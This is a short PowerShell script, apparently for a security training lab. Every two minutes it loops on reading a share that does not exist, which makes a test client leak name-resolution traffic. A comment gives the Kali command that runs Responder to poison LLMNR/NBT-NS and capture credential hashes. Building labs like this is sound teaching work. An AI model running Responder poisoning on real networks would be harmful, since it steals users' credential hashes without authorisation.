#Run this on US-Client to simulate a user fat fingering a share drive
#On Kali: sudo responder -I eth0 -dwv

$X = 0
Do
{
Get-Content "\\NoExist\C$"
Start-Sleep -Seconds 120
#$X = $X + 1
}
While($X -le 10)